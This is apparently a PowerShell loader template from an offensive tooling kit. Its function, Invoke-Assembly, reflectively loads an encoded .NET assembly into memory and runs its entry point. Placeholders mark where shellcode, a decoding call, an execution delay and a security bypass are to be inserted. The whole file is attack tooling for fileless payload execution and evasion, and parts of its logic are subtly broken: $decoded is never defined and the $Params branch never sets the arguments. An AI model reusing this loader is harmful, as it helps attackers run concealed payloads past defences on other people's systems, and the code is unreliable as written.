####CODE####

function Invoke-Assembly
{
    [CmdletBinding()]

	param
	(
		[Parameter(Mandatory=$False)]
		[string]$Params,

		[Parameter(Mandatory=$False)]
		[string[]]$ParamsArray
	)

    [string[]] $arguments = @()
    if ($ParamsArray.Count -gt 0){
        $arguments = $ParamsArray
    }

    elseif (-not [string]::IsNullOrEmpty($Params)){
        [string] $string_args = [string]::Join('", "', $Params.Split(' '))
        if (-not [string]::IsNullOrEmpty($arguments)){
            $arguments = ('"' + $string_args + '"').Split(' ')
        }
    }

    $encoded = <####SHELLCODE####>

    ####CALL####

    $obj =[System.Reflection.Assembly]::Load($decoded)

    [object[]] $PEArgs = @(,$arguments)
    $result = $obj.EntryPoint.Invoke($null, $PEArgs)

    Write-Output $result
}

####DELAY####

####BYPASS####

Invoke-Assembly -ParamsArray $args